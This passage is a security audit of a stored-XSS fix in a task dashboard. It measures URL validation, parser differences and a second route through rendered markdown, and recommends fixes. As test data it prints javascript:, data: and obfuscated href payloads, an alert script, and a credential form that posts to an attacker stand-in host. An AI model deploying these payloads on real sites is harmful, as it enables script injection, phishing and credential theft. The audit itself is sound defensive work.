# audit-xss-r1 — security audit: production effect of the stored-XSS fix

Tree: `/workspace` (`git rev-parse --show-toplevel` → `/workspace`)
Branch: `url-scheme-validation`
Commit: `d4c4e6b629ade1d0725bc303c0acf962838f03c9` `[MEASURED]`
Base: `7a0f220` `[MEASURED as the parent of 4187910; NOT verifiable as origin/main here — see BRIEF-6]`
`git status --porcelain` → empty at start and at end `[MEASURED]`

**Verdict: APPROVE.**

The change is correct, well-pinned, and a strict improvement over `7a0f220`. I could not
construct a single input that it lets through. It should merge. But it does not close the
vulnerability class it names, and the two findings below (F1, F2) must be tracked as *the same
finding continued*, not as new work.

---

## 0. THE HEADLINE — before/after (Deliverable 2)

> **At `7a0f220` an attacker holding `task:write` could render an arbitrary attacker-chosen URL
> under first-party dashboard chrome. At `d4c4e6b` they can still do exactly that, by a different
> route: the task description and comment body are rendered through
> `unsafeHTML(renderMarkdown(...))`, which emits a real `<a href>` governed by DOMPurify's default
> scheme policy — a strictly *wider* policy than the `{http, https}` allow-list this change
> installs — with no `target="_blank"` and no `rel="noopener"`, and it also permits
> `<form action="https://attacker/">` and `<img src="https://attacker/">`.**

What genuinely changed:

| | `7a0f220` | `d4c4e6b` |
|---|---|---|
| Store `javascript:`/`data:`/`vbscript:`/`blob:` in `remote_url` or `pull_requests[].url` via gRPC | **yes** | **no** — `InvalidArgument` `[MEASURED]` |
| Same via collection import | **yes** | **no** `[MEASURED]` |
| Rows already holding such a value render as a live `<a href>` | **yes** | **no** — inert `<span>` `[MEASURED, 24/24 payloads]` |
| Attacker-chosen `https://evil/` link under dashboard chrome, via `remote_url` | **yes** | **yes** (by design — `http(s)` is allowed) |
| Attacker-chosen `https://evil/` link under dashboard chrome, via **description / comment markdown** | **yes** | **yes, unchanged** `[MEASURED]` |
| Attacker-authored `<form action="https://attacker/">` inside the dashboard | **yes** | **yes, unchanged** `[MEASURED]` |
| `remote_url` synthesised on the **read** path by the live GitHub passthrough store | unvalidated | **still unvalidated** — write-boundary guard cannot reach it `[MEASURED]` |

So the honest summary is: **the change closes the `javascript:`-class payload completely and
closes the client-controlled write ingress completely; it does not close the harm the change's own
report defends as the defensible one.**

---

## 1. The standing correction — now settled by measurement

The EM's retracted claim ("clicking the link executes attacker script in the dashboard origin")
was correctly retracted, and the author was right to decline to assert execution under JSDOM.
**I settled it in a real engine.** `/usr/bin/chromium` is present in this environment (the
author's report §1 states "I had no real browser engine available" — that was wrong; see AUTH-1).

Harness: `/tmp/xssprobe/nav.js`, real anchors, real `.click()`, Chromium 
headless over `http://127.0.0.1:8731/`.

```
control_self            (no target)                  -> EXECUTED      <- positive control
control_self_explicit   (target="_self")             -> EXECUTED      <- positive control
blank                   (target="_blank")            -> NOT_EXECUTED
blank_noopener          (target="_blank" rel=noopener) -> NOT_EXECUTED   <- the shipped shape
blank_noreferrer                                     -> NOT_EXECUTED
named_target            (target="someframe")         -> NOT_EXECUTED
__popupsAllowed: false (popup blocker on) / true (--disable-popup-blocking)
```

Both runs agree. The `__popupsAllowed: true` result in the second run is the control that matters:
popups genuinely opened in that configuration, so the non-execution is the HTML navigate
algorithm's "javascript: URL into a non-source browsing context" rule, **not** the popup blocker.

**ESTABLISHED:** in Chromium, `javascript:` in an anchor with no target or `target="_self"`
**executes**; with `target="_blank"` it **does not**.
**ESTABLISHED:** `target="_blank"` was therefore load-bearing, and nothing pinned it before this
change. **The pin is meaningful** — it is the difference between "phishing affordance" and
"script execution in the dashboard origin". `web/src/util/safe-url.test.ts:157-183` pins it,
fail-closed (renaming the variable or splitting the anchor across lines makes the assertion fire).
**NOT ESTABLISHED:** the same in Firefox or WebKit. Chromium only.

On the brief's claim that "`data:` and `vbscript:` sit in the same open set and are **not equally
mitigated**": I measured all four under the shipped `target="_blank" rel="noopener"` shape and
again without `rel="noopener"` so a report-back was possible. `javascript:`, `data:`, `vbscript:`
and `blob:` **all** failed to execute. The `javascript:` result carries a strong positive control
(the `_self` case fires); the `data:`/`blob:` results do not carry an independent control that a
`data:` popup could have reported back at all, so I rate them **inferred, not established**. The
brief's "not equally mitigated" is **not supported by anything I measured** (BRIEF-4).

---

## 2. The parser-disagreement intersection (brief item 2 / item 4)

This was the EM's priority and it produces a **clean negative with 24 positive controls**.

**Method.** 80-input corpus (`/tmp/xssprobe/corpus.json`) covering scheme confusion, ASCII and
Unicode whitespace, control characters, NUL, percent-encoding, HTML entities, backslash/userinfo
host confusion, opaque and scheme-relative forms, IDN/homograph, dotless-decimal hosts, and the
known `java<tab>script:` disagreement. Each input run through:

1. the real `validateURLField` (temporary `internal/server/zz_audit_probe_test.go`, **deleted**;
   `git status --porcelain` empty afterwards `[MEASURED]`);
2. the real compiled `safeHref` (from `web/.tmp-test/util/safe-url.js`, i.e. the shipped source
   via the project's own `tsc`), executed **in Chromium**, not Node and not JSDOM;
3. a real `<a>` element with `setAttribute('href', raw)`, reading `.protocol`/`.href` — i.e. what
   the DOM would actually navigate to;
4. the same for `safeHref`'s **return value**, since `safeHref` returns the *original* string, not
   the normalised one.

Run under two document bases (`file://` and `http://127.0.0.1:8731/`) because `safeHref` parses
with **no base** while the DOM resolves **with** one.

### Result

| class | definition | count |
|---|---|---|
| **1** | **server ACCEPTS + `safeHref` ACCEPTS + shipped href resolves to a non-`http(s)` protocol** | **0 / 80** |
| 2 | server accepts, `safeHref` rejects (storable but never renders) | 2 / 80 |
| 3 | server rejects, `safeHref` accepts (legacy/platform rows still render) | 12 / 80 |
| 4 | **positive control** — Blink resolves to a dangerous scheme; did `safeHref` block it? | **24 / 80, blocked 24 / 24** |
| 5 | `safeHref` accepts but its parse disagrees with DOM resolution | 0 / 80 (see F6 for the case that *does* diverge) |

**Class 1 is empty under both bases. The exploitable intersection the EM asked for does not
exist in this corpus.** Class 4 is the control that makes that negative meaningful: the harness
detects dangerous resolution in 24 cases including every variant of the known disagreement
(`java\tscript:`, `java\nscript:`, `java\rscript:`, `jAv\tAsCrIpT:`, `javascript\t:`,
` javascript:`, `da\tta:`, `bl\tob:`) — all resolve to `javascript:`/`data:`/`blob:` in real Blink
and all are rejected.

**Why this is structural, not luck.** Both parsers extract a scheme token as
`[A-Za-z][A-Za-z0-9+.-]*` before the first `:`. WHATWG additionally strips leading C0/space and
all interior tab/CR/LF *before* tokenising. `validateURLField` rejects every rune `<= 0x20` and
`0x7f` **before** parsing (`urlvalidate.go:53-58`), which removes exactly the inputs where the two
tokenisers can diverge. After that filter the two parsers see byte-identical input and must agree
on the scheme. The control-character pre-check is therefore not belt-and-braces — **it is the
thing that makes the allow-list sound**, and the comment at `urlvalidate.go:48-52` is right.

**Predictions vs measurement (brief rule: predict first, report misses).**
- Predicted Class 1 empty → **hit**.
- Predicted `https:evil.com` would resolve same-origin under a base and so diverge → **miss**
  under an `http:` base (base scheme ≠ URL scheme routes to *special authority slashes state*).
  Re-tested with matching schemes and the divergence is real — see F6.
- Predicted Unicode lookalike schemes (Kelvin sign `K`, long-s `ſ`) might fold to ASCII somewhere
  → **miss**, both throw in Blink and are rejected by Go.
- Did **not** predict Class 3 would be 12/80. That is F5.

**Methodology note worth recording.** My first probe page hung Chromium for three runs. Cause: the
corpus contains `data:text/html,<script>alert(1)</script>`, and embedding it in a `<script>` block
let the literal `</script>` close the tag — my own harness got XSS'd and a blocking `alert()`
froze the page. It is a small live demonstration that these payloads are not theoretical once they
reach an HTML-parsing context.

---

## 3. Findings

### F1 — [HIGH] The live GitHub passthrough store puts `remote_url` on the wire on every READ, and no write-boundary guard can ever cover it. The change's stated exclusion describes dead code.

**Location:** `internal/platform/github/graphql_queries.go:476-487` (`"remote_url": issue.URL.String()`)
→ `internal/platform/github/passthrough.go:147` → `internal/server/convert.go:321-323`
→ `web/src/components/inspector/ft-inspector-meta.ts:627`.
Wiring: `cmd/farmtable-server/main.go:61` `s.SetResolver(github.NewPlatformResolver())`
→ `internal/platform/github/resolver.go:26` → `NewPassThroughStore(...)`. `[MEASURED — read the files]`

**Description.** The author's design doc (`.design/project-log/url-scheme-validation-stored-xss.md:64-65`)
and report §2 exclude platform sync on the grounds that "values originate from the upstream GitHub
API, not a client request". That justification describes `internal/platform/github/github.go`
(`buildRemoteData`, line 257) — which **has no production caller**; every constructor of that
adapter is in a `_test.go` file. The code that actually runs in production is the *passthrough
store*, and it behaves differently in a way that matters:

- It is a **read-through**, not a sync. `remote_url` is synthesised from the GraphQL response on
  **every `ListTasks`/`GetTask`**. It is never persisted, so there is no write boundary to guard —
  `validateURLField` is structurally incapable of covering this path.
- `GitHubPassThroughStore.UpdateTask` (`passthrough.go:315-459`) **ignores `p.RemoteData`
  entirely**. So for a GitHub collection, the value the server just validated at `server.go:663`
  is discarded, and the `remote_url` in the response comes straight from GitHub.
- `githubv4.URI.UnmarshalJSON` is a bare `url.Parse`. It imposes no scheme constraint. A
  `javascript:` value in the response would be carried verbatim.

**Impact.** For every GitHub-platform collection, `safeHref()` is **not defence in depth — it is
the only control**. The comment at `safe-url.ts:5-8` ("This is defence in depth… rows written
before that check existed") materially understates its role, and a future reader trusting that
comment could remove it.

**Is it attacker-reachable today?** I could not make it so, and I looked hard. `issue.URL` is
GitHub-generated. Attacker-authored GitHub content (issue body → `Task.Description`, label names,
milestone titles, sub-issue titles) never enters a URL key. There is **no webhook receiver at all**
(`grep -rn -i "webhook\|X-Hub"` over `internal/` and `cmd/` → 0 hits; positive control:
`grep -rn "HandleFunc" internal/serverapp/linkflows.go` → 6 hits), so there is no unsigned-payload
ingress and no missing HMAC. There is **no GHE / custom base-URL configuration** — both clients are
`gh.NewClient(tc)` / `githubv4.NewClient(httpClient)` with library defaults, and
`internal/platform/github/config.go` exposes only `owner`/`repo`/`labels`. There is no regex that
extracts a URL out of free text anywhere in the tree (`grep -rn "regexp" internal/ cmd/` → **0
hits**; positive control: `grep -rn "strings.Contains" internal/` → 48).

So the trusted-upstream argument **survives** — but the property it actually rests on is narrower
than stated and is written down nowhere: *"the value came from the `url` field of GitHub's own
GraphQL response, over TLS, from the hardcoded `api.github.com`."* Two things weaken it:

- `internal/platform/github/testing.go:8` exports `SetTestGraphQLClient(s, client)` from a
  **non-`_test.go` file**, so it compiles into the production binary and any importer can
  repoint the endpoint. `internal/server/passthrough_e2e_test.go:105,111` demonstrates the exact
  shape: point at an arbitrary server, and its `"url"` becomes `remote_url` verbatim.
- `owner`/`repo` derive from `Collection.RemoteID`, settable by any caller with
  `collection:write` with **no format validation** (`server.go:1044-1058`). In the live GraphQL
  path they are bound as typed variables so they cannot escape into the URL; in the dead REST path
  they would be interpolated into a URL path.

**Rating.** HIGH — not because it is exploitable today, but because (a) the documented reason for
the exclusion points at the wrong file, so the next reader will re-derive the wrong safety
argument; (b) the sole remaining control is a frontend function whose regression test **never runs
in CI**; and (c) `passthrough.UpdateTask` silently discards the validated value, which is a
correctness surprise as well as a security one.

**Recommendation.** Do not add a rejection in the adapter (it could break sync on upstream data).
Validate on the way *out*, at the single convergence point, where a rejection degrades instead of
erroring:

```go
// internal/server/convert.go, replacing lines 321-323
if remoteURL, ok := t.RemoteData["remote_url"].(string); ok && remoteURL != "" {
    // Values on this path are not all client-written: the GitHub passthrough store
    // synthesises remote_url on every read (platform/github/graphql_queries.go:480),
    // so no write-boundary check covers it. Drop rather than error — a bad URL from
    // upstream must not fail the whole read.
    if err := validateURLField("remote_url", remoteURL); err == nil {
        pt.RemoteUrl = &remoteURL
    }
}
```

Separately: move `SetTestGraphQLClient` into an `export_test.go`, and correct the design doc so it
names `passthrough.go`, not `github.go`.

---

### F2 — [HIGH] The harm this change defends against is fully open by a second route: markdown description and comment body.

**Location:** `web/src/util/markdown.ts` (whole file) →
`web/src/components/inspector/ft-inspector-desc.ts:233` `${unsafeHTML(renderMarkdown(this.description))}`
and `web/src/components/inspector/ft-inspector-comments.ts:221` `${unsafeHTML(renderMarkdown(c.body))}`.
Both live at `d4c4e6b` `[MEASURED]`.

**Reachability.** `CreateTask`/`UpdateTask` `description` is validated for **length only**
(`server.go:78-83`). `AddComment` requires only `ScopeTaskWrite` (`server.go:826`). Same
precondition as the vulnerability this change fixes.

**Measured** (real `marked@15` + `DOMPurify@3` as configured, `renderMarkdown` semantics):

```
markdown link http    -> <a href="https://evil.example.com/phish">click me</a>
raw anchor html       -> <a href="https://evil.example.com/phish">Approve deploy</a>
raw anchor javascript -> <a>x</a>                       (blocked — good)
raw anchor data/blob/vbscript -> <a>x</a>               (blocked — good)
raw anchor mailto     -> <a href="mailto:x@y.z">x</a>   \
raw anchor tel        -> <a href="tel:+15551234">x</a>   |  ALLOWED here,
raw anchor ftp        -> <a href="ftp://evil…/x">x</a>   |  REJECTED by safeHref
raw anchor sms/cid/xmpp -> allowed                      /   and by the server
markdown image        -> <img src="https://attacker.example.com/pixel.gif">
raw img remote        -> <img src="https://attacker.example.com/track.gif">
form action           -> <form action="https://attacker.example.com/steal"><input name="p"><button>Go</button></form>
iframe / svg onload   -> stripped (good)
```

**Impact.** Three distinct gaps, all producing the exact harm the change's own report names as the
defensible one — *"an arbitrary attacker-chosen URL rendered under first-party dashboard chrome"*:

1. **Wider scheme policy than the app's own.** DOMPurify's default `IS_ALLOWED_URI` admits
   `mailto:`/`tel:`/`ftp:`/`sms:`/`cid:`/`xmpp:`. The author's Decision A
   (report §4) deliberately excluded `mailto:` from `safeHref` on the reasoning that "a client
   rendering a scheme the server rejects is dead code". That reasoning is sound for the two guarded
   anchors and **false for the application as a whole**, because this path renders six such schemes
   today.
2. **No `target="_blank"`, no `rel="noopener"`.** Markdown-generated anchors navigate the
   dashboard tab itself. Per §1 I measured that a `_self` anchor is precisely the configuration in
   which `javascript:` *does* execute. DOMPurify is currently the only thing preventing that — so
   `target="_blank"` (pinned here) and DOMPurify (unpinned, untested in this tree) are each
   covering the other's gap, and neither is exercised by CI.
3. **`<form action>` and `<img src>` to arbitrary hosts.** A credential-harvesting form rendered
   inside the dashboard is a *stronger* phishing affordance than a link, and `<img src>` fires an
   unconditional outbound request (IP/UA logging, `Referer` leaking dashboard URLs) with no click
   required.

**Scope note.** Per the brief the markdown sanitizer is assigned elsewhere and **I have opened no
fix for it.** I am reporting it because Deliverable 2 asks whether an attacker can still do the
same thing by a different route, and the measured answer is yes. The absence of a CSP (also
assigned elsewhere) raises this: a `form-action 'self'`, `img-src`, and `connect-src` policy would
blunt all three sub-findings, and there is none.

**Recommendation (for the owning track, not this one).** Configure DOMPurify explicitly rather
than by default — at minimum `ALLOWED_URI_REGEXP: /^https?:/i` to match the policy this change
establishes, plus an `afterSanitizeAttributes` hook adding `target="_blank" rel="noopener
noreferrer"` to every anchor, and drop `<form>`/`<input>`/`<button>` from `ALLOWED_TAGS`. The
scheme constant should be **imported from `util/safe-url.ts`** so the app has one URL policy
instead of two.

---

### F3 — [MEDIUM] `urlBearingRemoteDataKeys` is a closed enumeration guarding an open set, enforced only by a comment — and the key that would break it is already in the map.

**Location:** `internal/server/urlvalidate.go:84-91`, `internal/server/convert.go:318-323`.

**Description.** `var urlBearingRemoteDataKeys = []string{"remote_url"}` with
`// Keep this in sync with the RemoteData reads in convert.go`. I measured the coupling: **there is
none.** `grep -rn "urlBearingRemoteDataKeys"` returns three hits, **all inside `urlvalidate.go`
itself** — the constant is referenced by exactly one loop and by no test. Nothing reads `convert.go`
to check agreement; nothing fails if they drift.

The drift is not hypothetical. `internal/platform/github/graphql_queries.go:482` **already writes
`html_url`** into the same map, and the whole untyped map crosses to the client
(`convert.go:324` `structpb.NewStruct(t.RemoteData)`, surfaced as `Task.remoteData` at
`web/src/gen/types.ts:252`). The day someone adds
`if u, ok := t.RemoteData["html_url"].(string); ok { pt.SomeUrl = &u }` to `convert.go`, or a
component reads `task.remoteData.html_url` directly, the collection-import path becomes an
unguarded ingress for that key **silently** — import copies `RemoteData` verbatim
(`export_import.go:76`), so an attacker sets `html_url` to anything.

**Impact.** Fails **open** on the next change. The `safeHref` render guard would still catch a
`javascript:` value at the two existing anchors, but only for values that reach *those two*
bindings; a new binding is exactly what the drift scenario posits.

**Recommendation.** Replace the comment with a test that reads the source, in the style the author
already used for the `target="_blank"` pin:

```go
// internal/server/urlvalidate_internal_test.go
func TestURLBearingRemoteDataKeysCoversConvertGo(t *testing.T) {
    src, err := os.ReadFile("convert.go")
    if err != nil { t.Fatal(err) }
    re := regexp.MustCompile(`RemoteData\["([a-z_]+)"\]`)
    var missing []string
    for _, m := range re.FindAllStringSubmatch(string(src), -1) {
        k := m[1]
        if !strings.Contains(k, "url") && !strings.Contains(k, "uri") { continue }
        if !slices.Contains(urlBearingRemoteDataKeys, k) { missing = append(missing, k) }
    }
    if len(missing) > 0 {
        t.Fatalf("convert.go surfaces URL-bearing RemoteData keys not in urlBearingRemoteDataKeys: %v", missing)
    }
    // positive control: the detector must see the key that IS there.
    if !slices.Contains(re.FindAllStringSubmatch(string(src), -1)[0], "platform") { /* ... */ }
}
```
Unlike the frontend pins, this one **would actually run** — `make test` is `go test ./...`.

---

### F4 — [MEDIUM] The `url-binding-scan` chokepoint has enumerable evasions, and given that nothing runs `npm test`, it is documentation rather than a gate.

**Location:** `web/src/util/url-binding-scan.test.ts:33-38` (rules), `:99-109` (walk), `:53-78`
(allow-list).

I agree with the author's design argument — a checklist does not stop the next binding, a
chokepoint does — and the scanner is genuinely well built (7 positive fixtures, 5 negative,
anti-rot assertions, a `viaSafeHref` import check). But its coverage is narrower than "any
URL-bearing binding":

| gap | example that evades it | why |
|---|---|---|
| quoted attribute | ``html`<a href="${task.remoteUrl}">x</a>` `` | rule needs `${` immediately after `=`. **This codebase already uses quoted bindings in ~36 places** (e.g. `ft-dependency-view.ts:1546`), so it is the idiomatic style here, not an exotic one |
| case | ``html`<a HREF=${u}>` `` | no `i` flag; HTML attribute names are case-insensitive |
| line split | `href=` and `${u}` on separate lines | matcher is per-line (`:120`) |
| other URL attributes | `action=`, `formaction=`, `srcdoc=`, `poster=`, `data=`, `srcset=`, `ping=`, `<sl-avatar image=>` | rule set is `href|src` only |
| indirect writes | `a.setAttribute('href', u)`, `a['href']=u`, `Object.assign(a,{href:u})` | needs a literal `.href`. The `Object.assign(document.createElement(...), {...})` shape **already exists** at `ft-app.ts:766`, `ft-toolbar.ts:701`, `ft-dependency-view.ts:1378` |
| navigation APIs | `window.open(u)`, `location.assign(u)`, `window.location = u` | only `location.href =` is caught |
| `unsafeHTML` | `${unsafeHTML(buildLinkHtml(task))}` | no `href` token in source — **this is F2, and the scanner is silent on it** |
| outside `web/src` | `web/index.html`, `web/public/`, any `.js`/`.mjs`, `src/styles/theme.css` | walk is `web/src` + `*.ts` only (`:104`) |
| allow-list laundering | a second `a.href = url;` anywhere in `ft-toolbar.ts` | `ALLOWED` matches `{file, exact trimmed line}` with **no line number** (`:189-191`), so a byte-identical line elsewhere in the same file is auto-approved |
| rubber-stamp `viaSafeHref` | any `href=${x}` in a file that imports safe-url once | `:209-216` checks the **file** imports `safeHref`, never that the binding uses it |

**Does the Makefile gap change the rating?** Yes, and this is my answer to the question the brief
asked. `[MEASURED]`: `Makefile:9-10` `test: go test ./...`; `Makefile:16-17`
`web: cd web && npm ci && npm run build`; `grep -rn "npm test\|npm run test"` across
`Makefile`/`*.yml`/`*.yaml`/`*.sh` → **0 hits**. So:

- **F4 itself I hold at MEDIUM, not higher** — the evasions are all *future* bindings, and this
  change adds no defective binding.
- **F1 moves from MEDIUM to HIGH** because of it. On the GitHub passthrough path `safeHref` is the
  sole control, and the test that would catch its removal never runs automatically.
- The author's central design claim — "the fix has to be a chokepoint" — **is not realised in the
  deployed pipeline.** `npm test` at `d4c4e6b` exits 0 and prints `safe-url: ok`,
  `url-binding-scan: ok` `[MEASURED]`; it just never runs unless a human types it.
- It changes **nothing** about F2, which is unaffected either way.

**Recommendation (for the CI track, filed here only as a severity input):** add `i` flags,
`["']?` before `\$\{`, the missing attribute names, `setAttribute\(\s*['"](?:href|src)`, and a line
number to the `ALLOWED` key.

---

### F5 — [LOW] The server and client decision sets are not equivalent, which falsifies an invariant asserted in `safe-url.ts`.

**Location:** `web/src/util/safe-url.ts:10-19`.

The comment states: *"The scheme set is deliberately identical to the server's allow-list… a scheme
the client allows and the server rejects is unreachable."* The **scheme sets** are identical. The
**decisions** are not, because the server applies three further rules (control-character
pre-check, Go's stricter `url.Parse`, non-empty `Host`) that the client does not replicate.

**Measured: 12 of 80 inputs are rejected by the server and accepted by `safeHref`.**

```
https://evil.com\@good.com/   https:/\evil.com/     http:/\/\evil.com
https:evil.com                https:/evil.com       https:///evil.com
HTT<TAB>PS://example.com      "https://example.com <TAB>"
https://example.com/<LF>a     http://exa mple.com
https://example.com\..\evil   https://example.com/<DEL>
```

All twelve resolve to `http:`/`https:` in Blink, so **none is a script-execution path** and none is
exploitable. The finding is that the stated reason ("unreachable") is wrong: it assumes the server
is the only writer, and F1 shows it is not — the GitHub passthrough path and pre-existing rows both
produce values the server never saw. This set is *precisely* the reachable-but-server-rejected set.

Latent trap worth naming: `https://evil.com\@good.com/` — Go parses `Host == "good.com"`; Blink
navigates to `evil.com`. Nothing depends on host identity today. If anyone later adds a host
allow-list, host-based audit logging, or a "you are leaving for X" interstitial built on the Go
parse, it will name the wrong host.

**Recommendation.** Amend the comment to say the scheme *sets* match but the decisions do not, and
name the reachable set (legacy rows + passthrough reads) rather than calling it unreachable.

---

### F6 — [LOW] `safeHref` decides against a URL the DOM will not resolve to.

**Location:** `web/src/util/safe-url.ts:50-67`.

`safeHref` judges `new URL(raw)` **with no base** but returns `raw`, which the DOM then resolves
**with** the document base. Where the raw scheme equals the document scheme and the URL is opaque,
those differ. `[MEASURED in Chromium, base `http://127.0.0.1:8731/`]`:

```
raw = "http:evil.com"    new URL() -> http://evil.com/    anchor -> http://127.0.0.1:8731/evil.com
raw = "http:/evil.com"   new URL() -> http://evil.com/    anchor -> http://127.0.0.1:8731/evil.com
raw = "http:.//evil.com" new URL() -> http://.//evil.com  anchor -> http://127.0.0.1:8731//evil.com
```

The divergence runs in the **safe** direction (the attacker's host is neutered to same-origin), and
the no-base decision is correct for the reason the comment gives — a base would launder
`//evil.com/x` into an accepted `https://evil.com/x`. So there is no bug to fix. But the invariant
"`safeHref`'s parse describes the URL the browser will use" is **false**, and it is not documented.
Anything built on that assumption later (display of the target host, telemetry, an allow-list) will
be wrong.

**Recommendation.** One comment line at `safe-url.ts:46`: *"The parse is used only for a
keep/reject decision. It is NOT the URL the DOM will resolve — `href` resolves `raw` against the
document base, which for same-scheme opaque forms (`http:evil.com`) yields a different origin. Do
not reuse this parse for anything host-dependent."*

---

### F7 — [INFO / adjacent, do not chase] GitHub API client follows cross-host redirects with a per-request `Authorization` header.

`internal/platform/github/graphql.go:20-31` and `github.go:33-43` build
`oauth2.NewClient(...)` wrapped in `newRateLimitTransport`. `[MEASURED]` `grep -rn "CheckRedirect"`
→ **0 hits** repo-wide, so the default follow-up-to-10 applies; `grep -rn "InsecureSkipVerify"`
→ **0 hits**, so TLS verification is intact everywhere. Because `oauth2.Transport` injects the
header inside `RoundTrip` on every hop, Go's built-in cross-host sensitive-header stripping does
not apply — a redirect from `api.github.com` to another host would receive the GitHub token.
`newRateLimitTransport` retries `429`/`403`/all `5xx` up to 3 times, amplifying it. Requires a
hostile or MITM'd `api.github.com`, hence INFO. Surfaced per brief item 6; not chased.

---

## 4. Deliverable 3 — my ingress denominator, my method, and what my method misses

**The author's denominator is 3 and it is correct for the question they asked.** I re-derived it
independently and agree: `server.go:641` (`add_pull_requests[].url`), `server.go:663`
(`remote_url`), `export_import.go:722` (`importedTask` → `PullRequests` + `RemoteData`). All three
guarded `[MEASURED]`.

**My denominator is 4, because I asked a different question.** The author enumerated
*client-controlled write paths*. The security property is *everything that can place a value in a
rendered `href`*.

**Method — sink-first, not annotation-first.** Start at the DOM sinks, walk backwards: sink → TS
type → proto field → `convert.go` → ent field → every writer of that ent field. I deliberately did
**not** use the proto `string.uri` annotations as the denominator (see BRIEF-2 for why that
denominator is misleading).

| # | writer | reaches | status |
|---|---|---|---|
| 1 | `server.go:641` `UpdateTask.add_pull_requests[].url` | `ent task.pull_requests` → PR anchor | **guarded** |
| 2 | `server.go:663` `UpdateTask.remote_url` | `ent task.remote_data["remote_url"]` → external-source anchor | **guarded** |
| 3 | `export_import.go:722` `importedTask` | both of the above | **guarded** |
| 4 | `platform/github/graphql_queries.go:480` (passthrough, **live**) | external-source anchor, **synthesised per read** | **UNGUARDED — F1** |

Non-writers I positively excluded:
- `platform/github/github.go:257` `buildRemoteData` — writes `html_url` only, **and has no
  production caller** (every constructor is in a `_test.go`). Positive control that the search
  works: the *other* constructor in the same package **is** wired, at `main.go:61`.
- `platform/beads/beads.go:383` — writes no URL key at all. Positive control: `grep "url\|URL"` in
  that file returns exactly one hit, `uuid.NameSpaceURL` at `:471`.
- `beads_import.go:312` — `PullRequests: []map[string]string{}` (empty), no `RemoteData`.
- `CreateTask` / `InsertTasksAfter` / `CreateCollection` / `UpdateCollection` — **no URL field
  exists in any of those request messages** `[MEASURED — printed `CreateTaskRequest` in full]`.
- `Collection.remote_data` (`export_import.go:332`) — client-controlled, **reaches no href**,
  confirmed: its only two client consumers are `capabilities.ts:98` and `ft-app.ts:256`, both
  reading a `writable` boolean for capability gating. **The author's claim verified.**
- `Attachment.url` — **dead field confirmed.** `grep -rn "Attachment"` over `internal/` and
  `proto/` excluding `.pb.go` returns **only the two proto lines** (`:238`, `:411`); no ent schema,
  no store field, no Go writer, no renderer. Positive control: the same grep shape finds
  `Attachment` 5+ times in generated `farmtable.pb.go`, so the term is greppable.
  **The author's claim verified — there is nothing there to fix.**

**What my method would miss, stated plainly:**
1. **A sink that does not exist yet.** The scanner is supposed to cover that; F4 lists its
   evasions and it does not run in CI.
2. **A writer reaching the ent field by a path I did not trace** — a raw SQL migration, an ent
   hook, direct DB access, or a store implementation I did not read. I read `entstore.go`,
   `multistore.go`, both platform adapters and both import paths; I did not read every ent
   generated file.
3. **A rendering mechanism that is not an `href=` binding.** My method only caught F2 because I
   enumerated *all* DOM sinks rather than only `href=`. An annotation-first or grep-for-`href`
   method would have missed it entirely — which is exactly what happened to the author.
4. **Non-dashboard renderers.** `internal/cli/output.go:46` emits `remote_url` in CLI JSON output
   (some terminals auto-linkify, generally only `http(s)`; low), and MCP tool responses carry task
   payloads to LLM agents that may render them. Neither is covered by `safeHref`. Not chased.
5. **Anything requiring runtime state I cannot see** — the production DB contents (see §5), and
   actual deployed env vars.

---

## 5. Deliverable 5 (brief item 5) — what is NOT fixed, rated

| # | residual | rating | notes |
|---|---|---|---|
| R1 | **Markdown/comment href route still fully open** | **HIGH** | F2. Author did not list this. It is the answer to "same thing by a different route" |
| R2 | **Passthrough read path unvalidated; stated exclusion names dead code** | **HIGH** | F1. Author listed this as "platform-sync writes unvalidated" but mis-attributed the mechanism |
| R3 | Already-poisoned rows: no migration | **MEDIUM** | Author listed. See below |
| R4 | `urlBearingRemoteDataKeys` drift | **MEDIUM** | F3. Author did not list |
| R5 | Frontend pins never run in CI | **MEDIUM** | Author listed obliquely; assigned elsewhere; it is what makes R2 HIGH |
| R6 | Server/client decisions not equivalent | **LOW** | F5. Author did not list; asserted the opposite |
| R7 | `safeHref` parse ≠ DOM resolution | **LOW** | F6. Author did not list |
| R8 | Execution untested | **RESOLVED** | Author listed. Settled in §1 — Chromium was available |

**Is a cleanup migration warranted (R3)?** My view: **yes, but as a one-off audit query, not a
schema migration.** The frontend guard neutralises these rows at render — measured, 24/24 — so this
is not urgent. But three things argue for looking:

- A poisoned row is *evidence of an attempted attack*, and right now nobody would know.
- The frontend guard is the only thing neutralising them, and per F4/R5 its test does not run in
  CI, so "it renders inert" is a property with no automated backstop.
- A poisoned row silently degrades to inert text, so a legitimate user with an odd-but-valid URL
  and an attacker's payload look identical in the UI.

What it would have to examine (all four are needed; the first two are the classic under-scoped
version):

1. `task.remote_data ->> 'remote_url'` — the obvious one.
2. `task.pull_requests[*].url` — JSON array, needs element-wise extraction.
3. **`task.remote_data` for *any* string value that parses with a non-`http(s)` scheme** — not just
   `remote_url`. The map is an open escape hatch (F3) and `html_url` is already in there.
4. **`task.description` and `comment.body` for embedded `<a href=`/`<form action=`/`<img src=`** —
   because of F2 this is where a payload is most likely to actually be, and it is the one an audit
   scoped to "URL fields" would skip.

Run it read-only first and report counts before deleting anything.

---

## 6. Positive observations

- **The allow-list-over-denylist decision is right and the reasoning at `urlvalidate.go:12-24` is
  correct**, including the observation that `uri = true` would not have helped because
  `javascript:alert(1)` is a well-formed RFC 3986 URI.
- **The control-character pre-check (`urlvalidate.go:53-58`) is the load-bearing part of the fix**,
  and my differential shows why: it is what forces the two parsers to agree. The comment already
  says it should not rely on `net/url`'s incidental behaviour — that judgement is exactly right.
- **Method-body placement over a gRPC interceptor is correct and the reasoning is verifiable.**
  The CLI pass-through registration installs no interceptors; an interceptor would have covered
  three of four paths.
- **Decision B (no base argument to `new URL()`) is right**, and my Class-3/Class-5 measurements
  support it: with a base, `//evil.com/x` would be laundered into an accepted `https://evil.com/x`.
- **Degrade-don't-drop** — a rejected URL renders as visible inert text with a `title` showing the
  raw value. This is the right call: it keeps the evidence visible to the user.
- **The `target="_blank"` pin is meaningful and I can now quantify it** — §1 measures it as the
  difference between phishing and script execution.
- **The author's RED-then-GREEN discipline, and specifically their green-control finding** — that
  `TestValidateURLField_AcceptsHTTPAndHTTPS` stayed green with validation entirely disabled — is
  the most valuable observation in their report and generalises beyond this change.
- **The author self-corrected three process errors** (a pipe swallowing an exit code, a grep with
  no positive control, a `git checkout` that wiped an uncommitted fix) and recorded them. That is
  the behaviour that makes the rest of the report trustworthy.
- `ft-toolbar.ts:461-465` **verified safe by construction** myself: `GITHUB_REPO_RE` is anchored
